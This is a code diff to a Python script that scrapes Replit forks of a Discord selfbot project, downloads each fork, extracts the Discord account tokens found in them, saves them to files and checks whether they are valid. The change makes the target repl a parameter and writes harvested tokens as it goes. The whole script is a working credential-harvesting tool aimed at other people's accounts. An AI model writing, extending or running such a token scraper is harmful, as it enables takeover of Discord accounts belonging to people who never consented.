@@ -8,7 +8,7 @@ from colorama import Fore as color
 
 
 
-async def main():
+async def main(url: str):
     if os.path.isfile("./false_tokens.txt"):
         os.remove("./false_tokens.txt")
 
@@ -17,25 +17,26 @@ async def main():
 
     repl = ReplIt()
     await Design.ascii()
-    id = await repl.get_id("/@YOUTUBEEZGAMING/Discord-Selfbot")
+    await aprint(f"{color.GREEN}Scraping {url}...{color.RESET}")
+    id = await repl.get_id(url)
     urls, ids = await repl.get_forks(id)
     await aprint(f"{color.GREEN}Forks found: {len(urls)}{color.RESET}")
     full = []
 
     for url, id in zip(urls, ids):
-        try:
-            await repl.get_zip(url, id)
-            tokens = await repl.search_zip(id)
-            full += tokens
-        except:
-            continue
+        with open("./false_tokens.txt", "a+") as f:
+            try:
+                await repl.get_zip(url, id)
+                tokens = await repl.search_zip(id)
+                for token in tokens:
+                    f.write(f"{token}\n")
+                full += tokens
+            except:
+                continue
 
 
     for token in full:
         await aprint(f"{color.GREEN}Found token: {token}{color.RESET}")
-    with open('./false_tokens.txt', 'a+') as f:
-        for token in full:
-            f.write(f"{token}\n")
     await aprint(f"{color.YELLOW}Removing duplicates... {color.RESET}")
     lines_seen = set()
     outfile = open("tokens.txt", "w")
@@ -44,7 +45,6 @@ async def main():
             outfile.write(line)
             lines_seen.add(line)
     outfile.close()
-
     await repl.check()
 
 
@@ -55,4 +55,4 @@ async def main():
 
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    asyncio.run(main("/@Ace1028/discord-selfbot"))
